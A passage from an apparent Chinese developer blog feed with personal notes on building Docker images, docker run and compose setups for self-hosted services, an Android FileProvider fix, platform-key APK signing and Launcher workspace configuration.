Docker环境的镜像的最底层都是debian11，所以这样尝试成功了，如果底层操作系统不同肯定不行。</p><p>在环境创建成功后我还需要将Java和Python代码放到容器中才能测试，这里可以通过启动容器时将宿主机目录挂载到容器中实现，但我用dockerfile放进了镜像中。Dockerfile文件内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"># 选择父镜像</span><br><span class="line"></span><br><span class="line">FROM ai_album_env</span><br><span class="line"></span><br><span class="line"># 设置工作目录</span><br><span class="line"></span><br><span class="line">WORKDIR /ai_album</span><br><span class="line"></span><br><span class="line"># 复制Java应用的jar包到镜像中</span><br><span class="line"></span><br><span class="line">COPY ai_album-1.0.0.jar /ai_album/ai_album-1.0.0.jar</span><br><span class="line"></span><br><span class="line"># 复制python服务文件夹和测试图片到镜像中</span><br><span class="line"></span><br><span class="line">COPY ai_server /ai_album/ai_server</span><br><span class="line"></span><br><span class="line">COPY photo /ai_album/photo</span><br><span class="line"></span><br><span class="line"># 设置环境变量JAVA_TOOL_OPTIONS</span><br><span class="line"></span><br><span class="line">ENV JAVA_TOOL_OPTIONS=&quot;-Dfile.encoding=UTF-8&quot;</span><br><span class="line"></span><br><span class="line"># 运行Java应用</span><br><span class="line"></span><br><span class="line">CMD [&quot;java&quot;, &quot;-jar&quot;, &quot;ai_album-1.0.0.jar&quot;]</span><br><span class="line"></span><br><span class="line">在 Dockerfile 文件所在的目录中执行 docker build 命令，将容器打包为镜像：</span><br><span class="line"></span><br><span class="line">docker build -t new_image_name:tag .</span><br><span class="line"></span><br><span class="line">其中，new_image_name 是你想要为新镜像设置的名称，tag 是镜像的标签（可选），. 表示 Dockerfile 所在的当前目录。</span><br></pre></td></tr></table></figure><p>2.2、 利用容器创建镜像</p><p>这个方法一般用于自己在容器中进行了一些操作，例如下载了一个Ubuntu的镜像，创建了一个容器，在这个容器中自己从零开始搭建好了环境，那么现在需要将这个容器保存，以便于分享给别人或者留作备份，就需要基于这个容器创建镜像。</p><p>使用 docker commit 命令来保存容器的状态为镜像：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit my_container new_image_name:tag</span><br></pre></td></tr></table></figure><p>其中，my_container 是容器的名称或容器ID，new_image_name 是你想要为新镜像设置的名称，tag 是镜像的标签（可选）。</p><p>执行完成就能够通过docker images命令看到生成的镜像了。</p><h2 id="3、踩坑"><a href="#3、踩坑" class="headerlink" title="3、踩坑"></a>3、踩坑</h2><h3 id="3-1、直接复制的环境会无法使用"><a href="#3-1、直接复制的环境会无法使用" class="headerlink" title="3.1、直接复制的环境会无法使用"></a>3.1、直接复制的环境会无法使用</h3><p>在选择用Python的dockerfile来创建环境前，采用的方法是在本地创建好python环境，直接将python所在的文件夹整个拷贝到镜像中，这个时候在容器中是无法运行python命令的，执行ls -l可以看到python3软连接指向python3.6<em>，这个python3.6</em> 指向python3.6，但我宿主机有python3.6，容器里面找不到这玩意，所以执行不了。具体应该是make编译的时候其实是将python装在了系统哪个目录下，不能只通过复制来执行。</p><p><img src="/upload/2023/08/image-cwgg.png"></p><h3 id="3-2、尝试下载python安装包拷贝到容器中进行解压按照"><a href="#3-2、尝试下载python安装包拷贝到容器中进行解压按照" class="headerlink" title="3.2、尝试下载python安装包拷贝到容器中进行解压按照"></a>3.2、尝试下载python安装包拷贝到容器中进行解压按照</h3><p>因为最底层的debian操作系统很多指令是没有的，下载了一个tar包，要解压，要编译，这些操作需要apt-get安装巨多工具，装的还慢，别再尝试这个方法了，还是到镜像仓库找找，其实dockerfile也是执行的这些安装指令，但是别人的指令是权威认证的，会下载需要的工具，使用完还会将不需要的工具卸载，站在巨人的肩膀上做事会容易很多。</p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常用Docker服务启动指令</title>
    <link href="/2023/08/20/%E5%B8%B8%E7%94%A8Docker%E6%9C%8D%E5%8A%A1%E5%90%AF%E5%8A%A8%E6%8C%87%E4%BB%A4/"/>
    <url>/2023/08/20/%E5%B8%B8%E7%94%A8Docker%E6%9C%8D%E5%8A%A1%E5%90%AF%E5%8A%A8%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p>记录一下玩docker的时候部署过的一些服务</p><h1 id="portainer-容器管理"><a href="#portainer-容器管理" class="headerlink" title="portainer 容器管理"></a>portainer 容器管理</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --restart always -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer </span><br></pre></td></tr></table></figure><h1 id="halo2-博客"><a href="#halo2-博客" class="headerlink" title="halo2 博客"></a>halo2 博客</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -d --name halo -p 8090:8090 --restart always -v C:\hukaichao\learn\.halo:/root/.halo2  halohub/halo:2.8  --halo.external-url=http://localhost:8090/  --halo.security.initializer.superadminusername=admin  --halo.security.initializer.superadminpassword=123qwe</span><br></pre></td></tr></table></figure><h1 id="samba-共享文件夹"><a href="#samba-共享文件夹" class="headerlink" title="samba 共享文件夹"></a>samba 共享文件夹</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --restart always --name samba -p 139:139 -p 445:445 -v /home/hu/share:/mount -d dperson/samba -u &quot;hu;123qwe&quot; -s &quot;share;/mount;yes;no;no;all;hu&quot; </span><br></pre></td></tr></table></figure><h1 id="jellyfin-影音管理"><a href="#jellyfin-影音管理" class="headerlink" title="jellyfin 影音管理"></a>jellyfin 影音管理</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">–name jellyfin \</span><br><span class="line">-v /home/hu/docker/jellyfin/config:/config\</span><br><span class="line">-v /home/hu/share:/share \</span><br><span class="line">-p 8096:8096 \</span><br><span class="line">–restart always \</span><br><span class="line">jellyfin/jellyfin</span><br></pre></td></tr></table></figure><h1 id="duplicati-备份工具"><a href="#duplicati-备份工具" class="headerlink" title="duplicati 备份工具"></a>duplicati 备份工具</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">  --name=duplicati \</span><br><span class="line">  -e PUID=1000 \</span><br><span class="line">  -e PGID=1000 \</span><br><span class="line">  -e TZ=Asia/Shanghai\</span><br><span class="line">  -e CLI_ARGS=  \</span><br><span class="line">  -p 8009:8200 \</span><br><span class="line">  -v /home/hu/docker/duplicati/config:/config \</span><br><span class="line">  -v /home/hu/docker/duplicati/backups:/backups \</span><br><span class="line">  -v /home/hu/docker/duplicati/source:/source \</span><br><span class="line">  -v /home/hu:/duplicati/home\</span><br><span class="line">  --restart always \</span><br><span class="line">  lscr.io/linuxserver/duplicati:latest</span><br></pre></td></tr></table></figure><h1 id="webstacknet-docker-compose-yaml-网址导航"><a href="#webstacknet-docker-compose-yaml-网址导航" class="headerlink" title="webstacknet  docker-compose.yaml 网址导航"></a>webstacknet  docker-compose.yaml 网址导航</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">version: &#x27;3&#x27;</span><br><span class="line">services:</span><br><span class="line">  db:</span><br><span class="line">    image: mysql/mysql-server:5.6</span><br><span class="line">    restart: always</span><br><span class="line">    container_name: &quot;mysql_wsl&quot;</span><br><span class="line">    environment:</span><br><span class="line">      MYSQL_ROOT_PASSWORD: Tym8zrnNRpz4</span><br><span class="line">      MYSQL_DATABASE: webstack</span><br><span class="line">      MYSQL_USER: webstack</span><br><span class="line">      MYSQL_PASSWORD: Xym8zrnNRpz</span><br><span class="line">    command: --default-authentication-plugin=mysql_native_password</span><br><span class="line">    networks:</span><br><span class="line">      - &quot;webstacknet&quot;</span><br><span class="line">  redis:</span><br><span class="line">    image: redis:3</span><br><span class="line">    container_name: &quot;redis_wsl&quot;</span><br><span class="line">    restart: always</span><br><span class="line">    networks:</span><br><span class="line">      - &quot;webstacknet&quot;</span><br><span class="line">  webstack:</span><br><span class="line">    image: arvon2014/webstack-laravel:v1.2.1</span><br><span class="line">    container_name: &quot;wsl&quot;</span><br><span class="line">    ports:</span><br><span class="line">      - 8000:8000</span><br><span class="line">    depends_on:</span><br><span class="line">      - &quot;db&quot;</span><br><span class="line">      - &quot;redis&quot;</span><br><span class="line">    environment:</span><br><span class="line">      LOGIN_COPTCHA: &quot;false&quot;</span><br><span class="line">      DB_HOST: db</span><br><span class="line">      DB_PORT: 3306</span><br><span class="line">      DB_DATABASE: webstack</span><br><span class="line">      DB_USERNAME: webstack</span><br><span class="line">      DB_PASSWORD: Xym8zrnNRpz</span><br><span class="line">    command: [&#x27;/entrypoint.sh&#x27;,&#x27;new-server&#x27;]</span><br><span class="line">    networks:</span><br><span class="line">      - &quot;webstacknet&quot;</span><br><span class="line">networks:</span><br><span class="line">  webstacknet:</span><br><span class="line">    driver: bridge</span><br></pre></td></tr></table></figure><h1 id="crawlab-docker-compose-yaml-网络爬虫管理工具"><a href="#crawlab-docker-compose-yaml-网络爬虫管理工具" class="headerlink" title="crawlab docker-compose.yaml 网络爬虫管理工具"></a>crawlab docker-compose.yaml 网络爬虫管理工具</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">version: &#x27;3.3&#x27;</span><br><span class="line">services:</span><br><span class="line">  master:</span><br><span class="line">    image: crawlabteam/crawlab</span><br><span class="line">    container_name: crawlab_master</span><br><span class="line">    restart: always</span><br><span class="line">    environment:</span><br><span class="line">      CRAWLAB_NODE_MASTER: &quot;Y&quot;  # Y: 主节点</span><br><span class="line">      CRAWLAB_MONGO_HOST: &quot;mongo&quot;  # mongo host address. 在 Docker-Compose 网络中，直接引用 service 名称</span><br><span class="line">      CRAWLAB_MONGO_PORT: &quot;27017&quot;  # mongo port </span><br><span class="line">      CRAWLAB_MONGO_DB: &quot;crawlab&quot;  # mongo database </span><br><span class="line">      CRAWLAB_MONGO_USERNAME: &quot;username&quot;  # mongo username</span><br><span class="line">      CRAWLAB_MONGO_PASSWORD: &quot;password&quot;  # mongo password </span><br><span class="line">      CRAWLAB_MONGO_AUTHSOURCE: &quot;admin&quot;  # mongo auth source </span><br><span class="line">    volumes:</span><br><span class="line">      - &quot;/opt/.crawlab/master:/root/.crawlab&quot;  # 持久化 crawlab 元数据</span><br><span class="line">      - &quot;/opt/crawlab/master:/data&quot;  # 持久化 crawlab 数据</span><br><span class="line">      - &quot;/var/crawlab/log:/var/logs/crawlab&quot; # log persistent 日志持久化</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;8001:8080&quot;  # 开放 api 端口</span><br><span class="line">    depends_on:</span><br><span class="line">      - mongo</span><br><span class="line"></span><br><span class="line">  mongo:</span><br><span class="line">    image: mongo:4.2</span><br><span class="line">    restart: always</span><br><span class="line">    environment:</span><br><span class="line">      MONGO_INITDB_ROOT_USERNAME: &quot;username&quot;  # mongo username</span><br><span class="line">      MONGO_INITDB_ROOT_PASSWORD: &quot;password&quot;  # mongo password</span><br><span class="line">    volumes:</span><br><span class="line">      - &quot;/opt/crawlab/mongo/data/db:/data/db&quot;  # 持久化 mongo 数据</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;27017:27017&quot;  # 开放 mongo 端口到宿主机</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>解决Android禁止应用之间共享文件URI</title>
    <link href="/2023/08/09/%E8%A7%A3%E5%86%B3Android%E7%A6%81%E6%AD%A2%E5%BA%94%E7%94%A8%E4%B9%8B%E9%97%B4%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6URI/"/>
    <url>/2023/08/09/%E8%A7%A3%E5%86%B3Android%E7%A6%81%E6%AD%A2%E5%BA%94%E7%94%A8%E4%B9%8B%E9%97%B4%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6URI/</url>
    
    <content type="html"><![CDATA[<p>异常：</p><figure class="highlight plaintext"><figcaption><span>EXCEPTION: main</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Process: com.techvision.scanandinstallapk, PID: 2135</span><br><span class="line">java.lang.RuntimeException: Failure delivering result ResultInfo&#123;who=null, request=101, result=-1, data=Intent &#123; dat=content://com.android.externalstorage.documents/document/1112-211D:Android/data/tomato.apk flg=0x1 &#125;&#125; to activity &#123;com.techvision.scanandinstallapk/com.techvision.scanandinstallapk.MainActivity&#125;: android.os.FileUriExposedException: file:///data/user/0/com.techvision.scanandinstallapk/cache/temp.apk exposed beyond app through Intent.getData()</span><br></pre></td></tr></table></figure><p>这个问题是由于应用尝试在Intent结果中使用了file:&#x2F;&#x2F; URI，而Android 7.0及更高版本引入了一个安全机制，禁止了应用之间共享文件URI。</p><p>为了解决这个问题，您可以使用FileProvider来生成一个内容提供者URI，并在Intent中传递该URI。请按照以下步骤进行修复：</p><p>1、在AndroidManifest.xml文件中添加FileProvider的配置。在<application>标签内添加以下代码：<br> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">provider</span></span></span><br><span class="line"><span class="tag">     <span class="attr">android:name</span>=<span class="string">&quot;androidx.core.content.FileProvider&quot;</span></span></span><br><span class="line"><span class="tag">     <span class="attr">android:authorities</span>=<span class="string">&quot;$&#123;applicationId&#125;.fileprovider&quot;</span></span></span><br><span class="line"><span class="tag">     <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">     <span class="attr">android:grantUriPermissions</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">         <span class="attr">android:name</span>=<span class="string">&quot;android.support.FILE_PROVIDER_PATHS&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">android:resource</span>=<span class="string">&quot;@xml/file_paths&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">provider</span>&gt;</span></span><br></pre></td></tr></table></figure><br>2、在res&#x2F;xml目录下创建一个名为file_paths.xml的XML文件，并将下面的内容添加到该文件中：<br> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">paths</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">external-path</span> <span class="attr">name</span>=<span class="string">&quot;external_files&quot;</span> <span class="attr">path</span>=<span class="string">&quot;.&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">paths</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>3、修改getFilePathFromUri()方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String <span class="title function_">getFilePathFromUri</span><span class="params">(Uri uri)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (uri != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">File</span> <span class="variable">apkFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(getCacheDir(), <span class="string">&quot;temp.apk&quot;</span>);</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> getContentResolver().openInputStream(uri);</span><br><span class="line">            <span class="type">OutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(apkFile);</span><br><span class="line"></span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4</span> * <span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> read;</span><br><span class="line">            <span class="keyword">while</span> ((read = inputStream.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                outputStream.write(buffer, <span class="number">0</span>, read);</span><br><span class="line">            &#125;</span><br><span class="line">            outputStream.flush();</span><br><span class="line">            outputStream.close();</span><br><span class="line">            inputStream.close();</span><br><span class="line"></span><br><span class="line">            filePath = apkFile.getAbsolutePath();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> filePath;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4、修改openFilePicker()方法如下：<br> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">private void openFilePicker() &#123;</span><br><span class="line">    Intent intent = new Intent(Intent.ACTION_GET_CONTENT);</span><br><span class="line">    intent.setType(&quot;application/vnd.android.package-archive&quot;);</span><br><span class="line">    intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);</span><br><span class="line">    Uri uri = FileProvider.getUriForFile(this, getApplicationContext().getPackageName() + &quot;.fileprovider&quot;, new File(getCacheDir(), &quot;temp.apk&quot;));</span><br><span class="line">    intent.putExtra(Intent.EXTRA_ALLOW_MULTIPLE, true);</span><br><span class="line">    intent.putExtra(Intent.EXTRA_LOCAL_ONLY, true);</span><br><span class="line">    intent.setDataAndType(uri, &quot;application/vnd.android.package-archive&quot;);</span><br><span class="line">    startActivityForResult(intent, REQUEST_CODE_PICK_APK);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    
    <categories>
      
      <category>android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>为apk添加系统签名</title>
    <link href="/2023/08/09/%E4%B8%BAapk%E6%B7%BB%E5%8A%A0%E7%B3%BB%E7%BB%9F%E7%AD%BE%E5%90%8D/"/>
    <url>/2023/08/09/%E4%B8%BAapk%E6%B7%BB%E5%8A%A0%E7%B3%BB%E7%BB%9F%E7%AD%BE%E5%90%8D/</url>
    
    <content type="html"><![CDATA[<h2 id="查看权限等级，"><a href="#查看权限等级，" class="headerlink" title="查看权限等级，"></a>查看权限等级，</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;permission android:name=&quot;android.permission.INSTALL_PACKAGES&quot;</span><br><span class="line">        android:protectionLevel=&quot;signature|privileged&quot; /&gt;</span><br></pre></td></tr></table></figure><p>signature &#x3D; 需要签名</p><p>privileged &#x3D; 特权APP，需要安装到指定位置 system&#x2F;priv-app</p><h2 id="为apk添加系统签名方法"><a href="#为apk添加系统签名方法" class="headerlink" title="为apk添加系统签名方法"></a>为apk添加系统签名方法</h2><p>1、如果是mm编译的apk，直接在Android.mk中进行修改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">packages/apps/PackageInstaller/Android.mk</span><br><span class="line">LOCAL_CERTIFICATE := platform 系统签名</span><br><span class="line">LOCAL_PRIVILEGED_MODULE := true 特权应用</span><br></pre></td></tr></table></figure><p>2、如果是 Android Studio 写的apk，则需要生成签名文件 采用工具：keytool-importkeypair</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./keytool-importkeypair -k system.keystore -p android -pk8 platform.pk8 -cert platform.x509.pem -alias platform</span><br></pre></td></tr></table></figure><p>会在out目录生成一个 system.keystore 密码为 android 别名为 platform</p><p>生成签名后，build.gradle 里 android 标签下添加如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">signingConfigs &#123;</span><br><span class="line">    debug &#123;</span><br><span class="line">        storeFile file(&quot;C:/hukaichao/Code/Andriod/system.keystore&quot;)</span><br><span class="line">        storePassword &quot;android&quot;</span><br><span class="line">        keyAlias &quot;platfrom&quot;</span><br><span class="line">        keyPassword &quot;android&quot;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这样通过Android studio运行的apk就拥有了系统签名</p><p>如果要通过Android studio 导出apk 则需要在导出时指定key文件</p>]]></content>
    
    
    <categories>
      
      <category>android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Launcher定制</title>
    <link href="/2023/08/09/Launcher%E5%AE%9A%E5%88%B6/"/>
    <url>/2023/08/09/Launcher%E5%AE%9A%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<p>关键词：Launcher；UI；客制化</p><h2 id="1、预置图标"><a href="#1、预置图标" class="headerlink" title="1、预置图标"></a>1、预置图标</h2><p>预置图标是在上述 default_workspace_XXX.xml 配置文件中进行添加，共 5 种标签类型。</p><h3 id="1-1、appwidget-待机界面小部件"><a href="#1-1、appwidget-待机界面小部件" class="headerlink" title="1.1、appwidget(待机界面小部件)"></a>1.1、appwidget(待机界面小部件)</h3><p>格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;appwidget</span><br><span class="line">launcher:screen=&quot;0&quot;</span><br><span class="line">launcher:x=&quot;0&quot;</span><br><span class="line">launcher:y=&quot;1&quot;</span><br><span class="line">launcher:spanX=&quot;4&quot;</span><br><span class="line">launcher:spanY=&quot;2&quot;</span><br><span class="line">launcher:packageName=&quot;com.android.deskclock&quot;</span><br><span class="line">launcher:className=&quot;com.android.alarmclock.DigitalAppWidgetProvider&quot; /&gt;</span><br></pre></td></tr></table></figure><ul><li>appwidget 配置属性介绍</li><li>screen：页面位置，第几页。</li><li>x：X坐标位置</li><li>y：Y坐标位置</li><li>spanX：Widget 宽度占用格子数</li><li>spanY：Widget 高度占用格子数</li><li>packageName：Widget 包名</li><li>className：Widget 类名</li></ul><h3 id="1-2、favorite-待机界面应用图标"><a href="#1-2、favorite-待机界面应用图标" class="headerlink" title="1.2、favorite(待机界面应用图标)"></a>1.2、favorite(待机界面应用图标)</h3><p>格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;favorite</span><br><span class="line">launcher:screen=&quot;0&quot; </span><br><span class="line">launcher:x=&quot;2&quot;</span><br><span class="line">launcher:y=&quot;3&quot;</span><br><span class="line">launcher:packageName=&quot;com.android.settings&quot;</span><br><span class="line">launcher:className=&quot;com.android.settings.Settings&quot; /&gt;</span><br></pre></td></tr></table></figure><h3 id="1-3、shortcut-待机界面快捷方式图标"><a href="#1-3、shortcut-待机界面快捷方式图标" class="headerlink" title="1.3、shortcut(待机界面快捷方式图标)"></a>1.3、shortcut(待机界面快捷方式图标)</h3><p>格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;shortcut</span><br><span class="line">launcher:icon=&quot;@drawable/app_icon&quot;</span><br><span class="line">launcher:title=&quot;@string/app_name&quot;</span><br><span class="line">launcher:uri=&quot;http://www.baidu.com/&quot;</span><br><span class="line">launcher:screen=&quot;0&quot;</span><br><span class="line">launcher:x=&quot;0&quot;</span><br><span class="line">launcher:y=&quot;0&quot; /&gt;</span><br></pre></td></tr></table></figure><p>shortcut 预置，一般预置的是网址书签、应用中某个 Activity（不带 Launcher 属性）、打开某个特殊文件<br>等快捷方式，可以自定义其 icon、title，通常建议使用“launcher:uri”标签。</p><h3 id="1-4、folder-待机界面文件夹"><a href="#1-4、folder-待机界面文件夹" class="headerlink" title="1.4、folder(待机界面文件夹)"></a>1.4、folder(待机界面文件夹)</h3><p>格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;folder</span><br><span class="line">launcher:title=&quot;@string/folder_name&quot;</span><br><span class="line">launcher:screen=&quot;0&quot;</span><br><span class="line">launcher:x=&quot;0&quot;</span><br><span class="line">launcher:y=&quot;3&quot;&gt;</span><br><span class="line">&lt;favorite</span><br><span class="line">launcher:packageName=&quot;com.android.settings&quot;</span><br><span class="line">launcher:className=&quot;com.android.settings.Settings&quot;</span><br><span class="line">launcher:x=&quot;0&quot;/&gt;</span><br><span 